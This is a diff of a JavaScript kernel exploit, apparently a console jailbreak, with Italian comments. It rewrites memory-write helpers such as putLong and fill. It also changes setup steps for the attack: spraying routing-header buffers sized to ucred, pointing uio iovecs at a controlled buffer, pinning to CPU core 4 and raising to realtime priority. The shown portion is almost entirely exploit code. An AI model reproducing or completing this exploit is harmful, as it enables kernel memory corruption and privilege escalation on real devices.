@@ -121,40 +121,42 @@ Buffer.prototype.write32 = function(offset, value) {
 Buffer.prototype.putLong = function(offset, value) {
     let lo, hi;
 
-
+   
     if (typeof value === "bigint") {
         lo = Number(value & 0xFFFFFFFFn);
         hi = Number((value >> 32n) & 0xFFFFFFFFn);
     }
-    
-    else if (value && Number.isInteger(value.lo) && Number.isInteger(value.hi)) {
+   
+    else if (value && typeof value === "object" && 
+             "lo" in value && "hi" in value) {
         lo = value.lo >>> 0;
         hi = value.hi >>> 0;
     }
-
+   
     else if (typeof value === "number") {
-        lo = value >>> 0;
+        lo = (value >>> 0);
         hi = 0;
     }
- 
+   
     else if (value && typeof value.toBigInt === "function") {
         const v = value.toBigInt();
         lo = Number(v & 0xFFFFFFFFn);
         hi = Number((v >> 32n) & 0xFFFFFFFFn);
     }
     else {
-        throw new Error("putLong(): valore NON valido → " + value);
+        throw new Error("putLong(): valore NON valido → " + typeof value);
     }
 
-    this.addr.write32(offset, lo);
-    this.addr.write32(offset + 4, hi);
+    // Scrivi i due valori a 32-bit
+    this.write32(offset, lo);
+    this.write32(offset + 4, hi);
 };
 
 
 Buffer.prototype.fill = function(byte) {
+    const fillByte = byte & 0xFF;
     for (let i = 0; i < this.size; i++) {
-        const addr = ptr_add(this.addr, i);
-        mem.write8(addr, byte);
+        this.write8(i, fillByte);
     }
 };
 
@@ -811,10 +813,9 @@ function performSetup() {
        sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);
 		
         // Prepare msg iov buffer
- 
-      log("test");
-        msg.putLong(0x10, msgIov.addr); // msg_iov
-        msg.putLong(0x18, MSG_IOV_NUM);      // msg_iovlen
+        log("Preparing msg buffer");
+        msg.putLong(0x10, msgIov.addr); // msg_iov - passa direttamente l'addr
+        msg.putLong(0x18, MSG_IOV_NUM);  // msg_iovlen
 
 		
 
@@ -823,18 +824,24 @@ function performSetup() {
 		uioIovRead.putLong(0x00, dummyBuffer.address());
         uioIovWrite.putLong(0x00, dummyBuffer.address());
        */
-		dummyBuffer.fill(0x41);
-		log("dummyBuffer addr =", dummyBuffer.addr.lo.toString(16), dummyBuffer.addr.hi.toString(16));
-     uioIovRead.putLong(0, addr_to_u64(dummyBuffer.addr));
-    uioIovWrite.putLong(0,addr_to_u64(dummyBuffer.addr));
+        log("Filling dummy buffer");
+        dummyBuffer.fill(0x41);	
+		log("dummyBuffer =", dummyBuffer );
+       uioIovRead.putLong(0, dummyBuffer.addr);
+        uioIovWrite.putLong(0, dummyBuffer.addr);
+		
 		
         // Affinity
         previousCore = getCurrentCore();
-        if (cpusetSetAffinity(4) !== 0) {
+		  const core4Mask = new Buffer(0x10);
+        core4Mask.write32(0, 1 << 4); // core 4
+        cpusetSetAffinity(core4Mask);
+		
+        /*if (cpusetSetAffinity(4) !== 0) {
             log("failed to pin to core");
             return false;
         }
-
+*/
 		log("set realtime priority");
        if (!setRealtimePriority(256)) {
            log("failed realtime priority");
@@ -1550,6 +1557,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
